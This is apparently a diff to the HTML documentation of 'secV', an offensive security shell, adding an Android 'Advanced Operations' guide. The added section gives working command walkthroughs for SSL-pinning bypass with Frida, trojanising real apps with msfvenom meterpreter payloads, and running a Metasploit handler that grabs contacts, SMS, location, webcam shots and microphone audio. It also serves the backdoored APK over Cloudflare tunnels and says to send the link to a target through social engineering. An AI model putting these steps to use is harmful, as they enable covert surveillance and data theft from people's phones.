@@ -979,13 +979,18 @@
         <table class="ref-table">
             <thead><tr><th>Operation</th><th>What It Does</th></tr></thead>
             <tbody>
-                <tr><td>recon</td><td>Device fingerprint — model, SDK level, security patch date, root status, bootloader, SELinux, screen lock, developer mode, USB debugging, ADB over network, kernel version, build ID</td></tr>
-                <tr><td>app_scan</td><td>Static APK analysis — pulls APK from device, decodes manifest, scans permissions (50+ dangerous flags), exported components, WebView config, cleartext traffic, backup flag, debuggable flag, certificate analysis, security score 0–100, secret scanning in decompiled smali</td></tr>
-                <tr><td>vuln_scan</td><td>Full vulnerability scan — device config weaknesses, 14+ CVE checks with NVD enrichment, installed app inventory for known-vulnerable apps, network service exposure on ports 5555/27042/27043/8080</td></tr>
-                <tr><td>exploit</td><td>Non-destructive exploitation tests — intent injection, SQL injection in content providers, path traversal, exported component manipulation, activity launching attacks</td></tr>
-                <tr><td>network</td><td>Network traffic analysis — tcpdump capture (requires root), protocol breakdown, HTTP/HTTPS detection, DNS query monitoring, insecure connection identification</td></tr>
-                <tr><td>forensics</td><td>Data extraction — system config files, app databases, SharedPreferences, system logs (main/system/crash), SMS/contacts (requires root), PII detection in logs</td></tr>
-                <tr><td>full</td><td>Runs all operations in sequence — complete penetration test report</td></tr>
+                <tr><td>recon</td><td>Device fingerprint — model, SDK, patch date, chipset, root status, bootloader, SELinux, screen lock, developer mode, USB debugging, ADB over network, kernel version, build ID</td></tr>
+                <tr><td>app_scan</td><td>Static APK analysis — pulls APK, decodes manifest, scans 50+ dangerous permissions, exported components, WebView config, cleartext traffic, backup flag, debuggable flag, cert analysis, security score 0–100, secret scanning in decompiled smali</td></tr>
+                <tr><td>vuln_scan</td><td>Full vulnerability scan — device config weaknesses, 20+ CVE checks (2016–2025) with vendor filtering and NVD live enrichment, wireless attack surface, world-readable files</td></tr>
+                <tr><td>exploit</td><td>Non-destructive exploitation — intent injection, SQL injection in content providers, path traversal, exported component manipulation, deep link hijacking, tapjacking, pending intent abuse</td></tr>
+                <tr><td>network</td><td>Traffic analysis — tcpdump capture (requires root), HTTP/HTTPS detection, DNS monitoring, proxy setup</td></tr>
+                <tr><td>forensics</td><td>Data extraction — app databases, SharedPreferences, system logs, SMS/contacts (requires root), PII detection, ADB backup</td></tr>
+                <tr><td>full</td><td>All of the above in sequence — complete report</td></tr>
+                <tr><td>frida_hook</td><td>Runtime instrumentation — auto-deploys frida-server via Magisk, SSL unpinning, root bypass, credential dump, method trace. See <a href="#advanced-operations" style="color:var(--blue);">Advanced Operations</a>.</td></tr>
+                <tr><td>backdoor_apk</td><td>Payload injection — msfvenom APK template injection, auto-sign, optional device install, generates handler RC. See <a href="#advanced-operations" style="color:var(--blue);">Advanced Operations</a>.</td></tr>
+                <tr><td>objection_patch</td><td>Frida gadget embed — no root needed at runtime. Uses objection patchapk. See <a href="#advanced-operations" style="color:var(--blue);">Advanced Operations</a>.</td></tr>
+                <tr><td>msf_handler</td><td>Metasploit handler + msgrpc — manage sessions from secV shell via <code>sessions list / interact / kill</code>. See <a href="#advanced-operations" style="color:var(--blue);">Advanced Operations</a>.</td></tr>
+                <tr><td>wan_expose</td><td>Cloudflare Tunnel — WAN APK delivery + MSF listener, persistent systemd services. See <a href="#advanced-operations" style="color:var(--blue);">Advanced Operations</a>.</td></tr>
             </tbody>
         </table>
 
@@ -1000,20 +1005,21 @@
         <table class="ref-table">
             <thead><tr><th>CVE</th><th>Severity</th><th>Vulnerability</th><th>Fix</th></tr></thead>
             <tbody>
-                <tr><td>CVE-2025-27363</td><td style="color:var(--red)">CRITICAL</td><td>FreeType OOB write, exploited in the wild</td><td>2025-03 patch</td></tr>
-                <tr><td>CVE-2024-45569</td><td style="color:var(--red)">CRITICAL</td><td>Qualcomm WLAN OOB write, remote, CVSS 9.8</td><td>2024-10 patch</td></tr>
-                <tr><td>CVE-2024-31317</td><td style="color:var(--red)">CRITICAL</td><td>Zygote RCE via ActivityManager</td><td>2024-05 patch</td></tr>
-                <tr><td>CVE-2024-0044</td><td style="color:var(--red)">CRITICAL</td><td>run-as sandbox bypass (Android 12–14)</td><td>2024-03 patch</td></tr>
-                <tr><td>CVE-2024-49415</td><td style="color:var(--orange)">HIGH</td><td>Samsung libsaped pre-auth RCE</td><td>2024-12 patch</td></tr>
-                <tr><td>CVE-2024-44068</td><td style="color:var(--orange)">HIGH</td><td>Samsung m2m scaler priv esc, ITW</td><td>2024-10 patch</td></tr>
-                <tr><td>CVE-2024-43047</td><td style="color:var(--orange)">HIGH</td><td>Qualcomm DSP UAF, exploited in the wild</td><td>2024-10 patch</td></tr>
-                <tr><td>CVE-2023-40088</td><td style="color:var(--orange)">HIGH</td><td>Bluetooth RCE in Android 11–13</td><td>2023-12 patch</td></tr>
+                <tr><td>CVE-2025-27363</td><td style="color:var(--orange)">HIGH</td><td>FreeType heap OOB write — ITW exploitation via crafted fonts</td><td>2025-03 patch · FreeType ≥2.13.3</td></tr>
+                <tr><td>CVE-2025-0084</td><td style="color:var(--orange)">HIGH</td><td>Android Framework priv esc via ActivityManagerService</td><td>2025-01 patch</td></tr>
+                <tr><td>CVE-2024-45569</td><td style="color:var(--red)">CRITICAL</td><td>Qualcomm WLAN heap OOB — unauthenticated RCE over Wi-Fi (Snapdragon)</td><td>QSB-2025-01</td></tr>
+                <tr><td>CVE-2024-44068</td><td style="color:var(--red)">CRITICAL</td><td>Samsung Exynos m2m UAF — priv esc to root, ITW (Samsung)</td><td>SMR-Oct-2024</td></tr>
+                <tr><td>CVE-2024-43047</td><td style="color:var(--red)">CRITICAL</td><td>Qualcomm FastRPC DSP UAF — kernel priv esc, ITW (Snapdragon)</td><td>ASB-2024-10</td></tr>
+                <tr><td>CVE-2024-49415</td><td style="color:var(--orange)">HIGH</td><td>Samsung libsaped heap OOB — RCE via voice audio (Galaxy S24)</td><td>SMR-Jan-2025</td></tr>
+                <tr><td>CVE-2024-31317</td><td style="color:var(--red)">CRITICAL</td><td>Zygote RCE via ActivityManager.setProcessMemoryTrimLevel()</td><td>2024-05 patch</td></tr>
+                <tr><td>CVE-2024-0044</td><td style="color:var(--red)">CRITICAL</td><td>run-as sandbox bypass — arbitrary app data read (Android 12–14)</td><td>2024-03 patch</td></tr>
+                <tr><td>CVE-2023-40088</td><td style="color:var(--red)">CRITICAL</td><td>Bluetooth RCE — code exec via crafted BT packet (Android 11–13)</td><td>2023-12 patch</td></tr>
+                <tr><td>CVE-2023-21264</td><td style="color:var(--red)">CRITICAL</td><td>KVM hypervisor priv esc (Pixel/Mali)</td><td>2023-08 patch</td></tr>
                 <tr><td>CVE-2023-20963</td><td style="color:var(--orange)">HIGH</td><td>WorkSource parcel mismatch priv esc</td><td>2023-03 patch</td></tr>
-                <tr><td>CVE-2021-0954</td><td style="color:var(--red)">CRITICAL</td><td>StrandHogg 2.0 task hijack</td><td>Android 11+</td></tr>
-                <tr><td>CVE-2020-0041</td><td style="color:var(--red)">CRITICAL</td><td>Binder priv esc, CVSS 9.8</td><td>2020-03 patch</td></tr>
-                <tr><td>CVE-2019-2215</td><td style="color:var(--orange)">HIGH</td><td>Binder UAF, exploited ITW</td><td>2019-10 patch</td></tr>
-                <tr><td>CVE-2017-0781</td><td style="color:var(--red)">CRITICAL</td><td>BlueBorne Bluetooth RCE</td><td>2017-09 patch</td></tr>
-                <tr><td>CVE-2016-5195</td><td style="color:var(--red)">CRITICAL</td><td>Dirty COW kernel priv esc</td><td>Kernel ≥4.8.3</td></tr>
+                <tr><td>CVE-2021-0954</td><td style="color:var(--red)">CRITICAL</td><td>StrandHogg 2.0 — task hijack on all Android &lt;11</td><td>Android 11+</td></tr>
+                <tr><td>CVE-2020-0041</td><td style="color:var(--red)">CRITICAL</td><td>Binder UAF — kernel priv esc, CVSS 9.8</td><td>Android 9+</td></tr>
+                <tr><td>CVE-2019-2215</td><td style="color:var(--red)">CRITICAL</td><td>Binder UAF — exploited ITW by NSO Group</td><td>Android 10+</td></tr>
+                <tr><td>CVE-2016-5195</td><td style="color:var(--red)">CRITICAL</td><td>Dirty COW — kernel priv esc via /proc race condition</td><td>Kernel ≥4.8.3</td></tr>
             </tbody>
         </table>
 
@@ -1211,6 +1217,317 @@
 <span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(mac_spoof) ❯ set iface wlan0</span>
 <span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(mac_spoof) ❯ set interval 300</span>
 <span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(mac_spoof) ❯ run localhost</span>
+            </div>
+        </div>
+
+        <!-- ── ADVANCED OPERATIONS ── -->
+        <h2 id="advanced-operations">Advanced Operations — android_pentest</h2>
+        <p>
+            Beyond recon and static analysis, <code>android_pentest</code> includes five runtime
+            attack operations: Frida hooking, APK backdooring, objection patching, a Metasploit
+            handler manager, and WAN payload delivery via Cloudflare Tunnel.
+            Each operation writes structured JSON results to the work directory and exposes session
+            management directly from the SecV shell.
+        </p>
+
+        <!-- frida_hook -->
+        <h3>frida_hook — Runtime Instrumentation</h3>
+        <p>
+            Auto-downloads the matching <code>frida-server</code> binary for the device architecture,
+            pushes it via ADB, starts it as root through Magisk, then attaches a generated JavaScript
+            hook script to the target app. Requires a rooted device. No manual frida-server setup needed.
+        </p>
+
+        <table class="ref-table">
+            <thead><tr><th>Parameter</th><th>Values</th><th>Description</th></tr></thead>
+            <tbody>
+                <tr><td>package</td><td>com.example.app</td><td>Target app package (required)</td></tr>
+                <tr><td>hook_mode</td><td>all · ssl_unpin · root_bypass · dump_creds · trace</td><td>Which hooks to inject. Default: all</td></tr>
+                <tr><td>hook_timeout</td><td>integer</td><td>Seconds to stay attached. Default: 30</td></tr>
+                <tr><td>trace_method</td><td>class substring</td><td>Used with hook_mode=trace — traces all matching classes</td></tr>
+            </tbody>
+        </table>
+
+        <div class="cmd-block">
+            <div class="cmd-bar">
+                <span class="cmd-dot r"></span><span class="cmd-dot y"></span><span class="cmd-dot g"></span>
+                <span class="cmd-bar-title">SSL unpin + credential dump on Instagram</span>
+                <span class="cmd-bar-lang">SecV</span>
+            </div>
+            <div class="cmd-body">
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">❯ use android_pentest</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set operation frida_hook</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set package com.instagram.android</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set hook_mode ssl_unpin</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set hook_timeout 60</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ run device</span>
+<span class="cmd-dim">[*] frida-server already running on device</span>
+<span class="cmd-dim">[*] Attaching frida to com.instagram.android (mode=ssl_unpin, timeout=60s)...</span>
+<span class="cmd-green">[+] OkHttp cert pinner bypassed: graph.instagram.com</span>
+<span class="cmd-green">[+] TrustManagerImpl.verifyChain bypassed</span>
+            </div>
+        </div>
+
+        <div class="callout">
+            <div class="callout-stripe" style="background:linear-gradient(90deg,var(--blue),var(--aqua));"></div>
+            <div class="callout-inner">
+                <div class="callout-head"><i class="fas fa-info-circle" style="color:var(--blue);"></i>frida-server auto-download</div>
+                <p style="font-size:clamp(.74rem,1.9vw,.84rem);color:var(--fg-muted);margin:0;">
+                    SecV matches the installed <code>frida-tools</code> version, downloads the correct
+                    <code>frida-server-{version}-android-{arch}.xz</code> from GitHub Releases,
+                    extracts it, pushes it to <code>/data/local/tmp/frida-server</code>, and starts it
+                    via <code>su -c</code>. The binary is cached in the work directory — subsequent
+                    runs skip the download. Device must be rooted (Magisk supported).
+                </p>
+            </div>
+        </div>
+
+        <!-- backdoor_apk -->
+        <h3>backdoor_apk — Payload Injection</h3>
+        <p>
+            Pulls the target APK from the device, passes it through <code>msfvenom -x</code> as a template
+            (preserves the original app's UI and functionality), signs the result with an auto-generated
+            debug keystore, and optionally installs it back on the device.
+            Also generates a ready-to-use Metasploit handler RC file.
+        </p>
+
+        <table class="ref-table">
+            <thead><tr><th>Parameter</th><th>Values</th><th>Description</th></tr></thead>
+            <tbody>
+                <tr><td>package</td><td>com.example.app</td><td>App to backdoor (required)</td></tr>
+                <tr><td>lhost</td><td>IP or hostname</td><td>Attacker address embedded in payload. Auto-detected from default route if blank.</td></tr>
+                <tr><td>lport</td><td>integer</td><td>Listener port. Default: 4444</td></tr>
+                <tr><td>payload</td><td>tcp · http · https · shell · stageless</td><td>Payload variant. Default: tcp (android/meterpreter/reverse_tcp)</td></tr>
+                <tr><td>install</td><td>true / false</td><td>Uninstall original and install backdoored APK. Default: false</td></tr>
+            </tbody>
+        </table>
+
+        <div class="cmd-block">
+            <div class="cmd-bar">
+                <span class="cmd-dot r"></span><span class="cmd-dot y"></span><span class="cmd-dot g"></span>
+                <span class="cmd-bar-title">Backdoor ZArchiver with stageless meterpreter</span>
+                <span class="cmd-bar-lang">SecV</span>
+            </div>
+            <div class="cmd-body">
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set operation backdoor_apk</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set package ru.zdevs.zarchiver</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set payload stageless</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set lport 4444</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ run device</span>
+<span class="cmd-dim">[*] Pulling APK for ru.zdevs.zarchiver...</span>
+<span class="cmd-dim">[*] Injecting payload android/meterpreter_reverse_tcp → 192.168.1.5:4444...</span>
+<span class="cmd-dim">[*] Signing APK...</span>
+<span class="cmd-green">[*] Backdoor ready. Start handler: msfconsole -q -r ~/.secv/android/.../handler.rc</span>
+            </div>
+        </div>
+
+        <!-- objection_patch -->
+        <h3>objection_patch — Gadget Embed (No Root Required)</h3>
+        <p>
+            Uses <code>objection patchapk</code> to embed the Frida gadget
+            (<code>libfrida-gadget.so</code>) directly into the APK's shared library directory.
+            When the patched app launches, the gadget starts automatically and listens for
+            an Objection connection — no frida-server, no root, no persistent device access needed.
+            Useful for testing on non-rooted devices or external devices you can't root.
+        </p>
+
+        <div class="cmd-block">
+            <div class="cmd-bar">
+                <span class="cmd-dot r"></span><span class="cmd-dot y"></span><span class="cmd-dot g"></span>
+                <span class="cmd-bar-title">Patch APK with Frida gadget, then explore at runtime</span>
+                <span class="cmd-bar-lang">SecV + terminal</span>
+            </div>
+            <div class="cmd-body">
+<span class="cmd-comment"># Step 1 — patch and install</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set operation objection_patch</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set package com.brave.browser</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set install true</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ run device</span>
+
+<span class="cmd-comment"># Step 2 — launch the app on device, then connect</span>
+<span class="cmd-prompt">$</span><span class="cmd-white"> objection --gadget com.brave.browser explore</span>
+
+<span class="cmd-comment"># Inside objection REPL:</span>
+<span class="cmd-yellow">com.brave.browser on (Android: 11) [usb]</span> <span class="cmd-white">❯ android hooking list classes</span>
+<span class="cmd-yellow">com.brave.browser on (Android: 11) [usb]</span> <span class="cmd-white">❯ android sslpinning disable</span>
+<span class="cmd-yellow">com.brave.browser on (Android: 11) [usb]</span> <span class="cmd-white">❯ android hooking watch class okhttp3.OkHttpClient</span>
+            </div>
+        </div>
+
+        <!-- msf_handler -->
+        <h3>msf_handler — Metasploit Handler + RPC</h3>
+        <p>
+            Generates a Metasploit RC file, optionally launches <code>msfconsole</code> with it,
+            and starts the <code>msgrpc</code> plugin so SecV can query and interact with live
+            sessions directly from the shell. Handler config (host, port, token) is written to
+            <code>~/.secv/msf_rpc.json</code> — the SecV shell reads this automatically.
+        </p>
+
+        <table class="ref-table">
+            <thead><tr><th>Parameter</th><th>Values</th><th>Description</th></tr></thead>
+            <tbody>
+                <tr><td>lhost</td><td>IP / hostname</td><td>Listener address. Auto-detected if blank.</td></tr>
+                <tr><td>lport</td><td>integer</td><td>Listener port. Default: 4444</td></tr>
+                <tr><td>payload</td><td>tcp · http · https · shell · stageless</td><td>Payload family. Default: tcp</td></tr>
+                <tr><td>launch</td><td>true / false</td><td>Start msfconsole immediately. Default: false</td></tr>
+            </tbody>
+        </table>
+
+        <div class="cmd-block">
+            <div class="cmd-bar">
+                <span class="cmd-dot r"></span><span class="cmd-dot y"></span><span class="cmd-dot g"></span>
+                <span class="cmd-bar-title">Start handler and manage sessions from secV shell</span>
+                <span class="cmd-bar-lang">SecV</span>
+            </div>
+            <div class="cmd-body">
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set operation msf_handler</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set lport 4444</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set launch true</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ run device</span>
+<span class="cmd-dim">[*] Launching msfconsole handler 192.168.1.5:4444...</span>
+<span class="cmd-green">[*] msfconsole running (PID 12438), RPC config at ~/.secv/msf_rpc.json</span>
+
+<span class="cmd-comment"># Device runs backdoored APK, session opens...</span>
+
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">❯ sessions list</span>
+<span class="cmd-dim">ID     TYPE         VIA                    TUNNEL               INFO</span>
+<span class="cmd-dim">────────────────────────────────────────────────────────────────────────</span>
+<span class="cmd-green">1      meterpreter  exploit/multi/handler  192.168.1.5 → :43221  SM-A305F @ samsung</span>
+
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">❯ sessions interact 1</span>
+<span class="cmd-yellow">meterpreter ❯ sysinfo</span>
+<span class="cmd-yellow">meterpreter ❯ geolocate</span>
+<span class="cmd-yellow">meterpreter ❯ dump_contacts</span>
+<span class="cmd-yellow">meterpreter ❯ webcam_snap</span>
+<span class="cmd-yellow">meterpreter ❯ record_mic</span>
+<span class="cmd-yellow">meterpreter ❯ run post/android/gather/sms</span>
+            </div>
+        </div>
+
+        <h3>sessions — Shell Commands</h3>
+        <p>
+            Once a handler is running with RPC enabled, the following commands are available
+            at any point in the secV shell — no module loaded required.
+        </p>
+
+        <table class="ref-table">
+            <thead><tr><th>Command</th><th>Description</th></tr></thead>
+            <tbody>
+                <tr><td><code>sessions list</code></td><td>List all active Meterpreter / shell sessions via msfrpcd RPC</td></tr>
+                <tr><td><code>sessions interact &lt;id&gt;</code></td><td>Drop into a live session (spawns msfconsole, ctrl+z to background)</td></tr>
+                <tr><td><code>sessions kill &lt;id&gt;</code></td><td>Terminate a session</td></tr>
+            </tbody>
+        </table>
+
+        <!-- wan_expose -->
+        <h3>wan_expose — WAN Payload Delivery</h3>
+        <p>
+            Exposes both the backdoored APK (via HTTP) and the Metasploit listener (TCP) over the
+            internet using Cloudflare Tunnel — no port forwarding, no VPS, no Cloudflare account required.
+            The operation starts two tunnels, writes their public URLs into a new <code>handler_wan.rc</code>
+            that you run against the WAN-facing endpoint, and registers systemd user services so both
+            tunnels survive reboots automatically.
+        </p>
+
+        <table class="ref-table">
+            <thead><tr><th>Parameter</th><th>Default</th><th>Description</th></tr></thead>
+            <tbody>
+                <tr><td>lport</td><td>4444</td><td>MSF listener port to tunnel</td></tr>
+                <tr><td>serve_port</td><td>8888</td><td>HTTP port for APK download</td></tr>
+                <tr><td>payload</td><td>tcp</td><td>Payload family written into handler_wan.rc</td></tr>
+            </tbody>
+        </table>
+
+        <div class="cmd-block">
+            <div class="cmd-bar">
+                <span class="cmd-dot r"></span><span class="cmd-dot y"></span><span class="cmd-dot g"></span>
+                <span class="cmd-bar-title">WAN delivery — full flow</span>
+                <span class="cmd-bar-lang">SecV</span>
+            </div>
+            <div class="cmd-body">
+<span class="cmd-comment"># 1. Generate backdoored APK first</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set operation backdoor_apk</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set package ru.zdevs.zarchiver</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ run device</span>
+
+<span class="cmd-comment"># 2. Expose over WAN</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set operation wan_expose</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ set lport 4444</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">(android_pentest) ❯ run device</span>
+<span class="cmd-dim">[*] Starting cloudflared http tunnel → localhost:8888...</span>
+<span class="cmd-dim">[*] Starting cloudflared tcp tunnel → localhost:4444...</span>
+<span class="cmd-green">[*] APK URL:  https://wild-lion-42.trycloudflare.com/zarchiver_backdoored_signed.apk</span>
+<span class="cmd-green">[*] MSF:      tcp://subtle-brook-7.trycloudflare.com:4444</span>
+<span class="cmd-dim">    systemd units written — tunnels survive reboot</span>
+
+<span class="cmd-comment"># 3. Start WAN handler</span>
+<span class="cmd-prompt">$</span><span class="cmd-white"> msfconsole -q -r ~/.secv/android/.../handler_wan.rc</span>
+
+<span class="cmd-comment"># 4. Send APK download link to target via social engineering</span>
+<span class="cmd-comment"># Once installed and launched, session opens back through the tunnel</span>
+<span class="cmd-cyan cmd-bold">secV</span> <span class="cmd-white">❯ sessions list</span>
+            </div>
+        </div>
+
+        <div class="callout">
+            <div class="callout-stripe" style="background:linear-gradient(90deg,var(--orange),var(--red));"></div>
+            <div class="callout-inner">
+                <div class="callout-head"><i class="fas fa-exclamation-triangle warn"></i>Tunnel persistence</div>
+                <p style="font-size:clamp(.74rem,1.9vw,.84rem);color:var(--fg-muted);margin:0;">
+                    SecV writes a systemd <em>user</em> service for each tunnel.
+                    To keep services alive after you log out (required for remote catch):
+                    run <code>loginctl enable-linger</code> once. To manage tunnels manually:
+                    <code>systemctl --user status secv-tunnel-4444</code>,
+                    <code>systemctl --user stop secv-tunnel-4444</code>.
+                </p>
+            </div>
+        </div>
+
+        <h3>Port Forwarding — Alternatives to Cloudflare</h3>
+        <p>
+            The <code>wan_expose</code> operation generates a full guide at
+            <code>~/.secv/android/.../portforward_guide.md</code>.
+            Summary of all options:
+        </p>
+
+        <table class="ref-table">
+            <thead><tr><th>Option</th><th>Cost</th><th>TCP</th><th>Persistent</th><th>Notes</th></tr></thead>
+            <tbody>
+                <tr><td>Cloudflare Tunnel</td><td>Free</td><td>✓</td><td>via systemd</td><td>No account. <code>yay -S cloudflared</code></td></tr>
+                <tr><td>ngrok</td><td>Free tier</td><td>✓</td><td>session expires</td><td><code>ngrok tcp 4444</code> — URL changes each session</td></tr>
+                <tr><td>SSH reverse tunnel</td><td>VPS cost</td><td>✓</td><td>via systemd</td><td>Requires a public VPS. Most reliable.</td></tr>
+                <tr><td>playit.gg</td><td>Free</td><td>✓</td><td>persistent</td><td>Gaming tunnel that supports TCP. No VPS needed.</td></tr>
+            </tbody>
+        </table>
+
+        <div class="cmd-block">
+            <div class="cmd-bar">
+                <span class="cmd-dot r"></span><span class="cmd-dot y"></span><span class="cmd-dot g"></span>
+                <span class="cmd-bar-title">Persistent SSH reverse tunnel with systemd (VPS method)</span>
+                <span class="cmd-bar-lang">bash</span>
+            </div>
+            <div class="cmd-body">
+<span class="cmd-comment"># On your VPS — allow remote port forwarding (once)</span>
+<span class="cmd-prompt">$</span><span class="cmd-white"> echo 'GatewayPorts yes' >> /etc/ssh/sshd_config && systemctl restart sshd</span>
+
+<span class="cmd-comment"># On attacker machine — create systemd service</span>
+<span class="cmd-prompt">$</span><span class="cmd-white"> cat > ~/.config/systemd/user/secv-revtunnel.service &lt;&lt; 'EOF'</span>
+<span class="cmd-yellow">[Unit]</span>
+<span class="cmd-white">Description=secV reverse SSH tunnel</span>
+<span class="cmd-white">After=network-online.target</span>
+<span class="cmd-yellow">[Service]</span>
+<span class="cmd-white">ExecStart=ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \</span>
+<span class="cmd-white">    -R 4444:localhost:4444 user@your-vps.com -N</span>
+<span class="cmd-white">Restart=always</span>
+<span class="cmd-white">RestartSec=15</span>
+<span class="cmd-yellow">[Install]</span>
+<span class="cmd-white">WantedBy=default.target</span>
+<span class="cmd-white">EOF</span>
+<span class="cmd-prompt">$</span><span class="cmd-white"> systemctl --user daemon-reload</span>
+<span class="cmd-prompt">$</span><span class="cmd-white"> systemctl --user enable --now secv-revtunnel</span>
+<span class="cmd-prompt">$</span><span class="cmd-white"> loginctl enable-linger   <span class="cmd-comment"># stay alive after logout</span></span>
+
+<span class="cmd-comment"># Now set LHOST=your-vps.com in backdoor_apk / handler.rc</span>
             </div>
         </div>
 
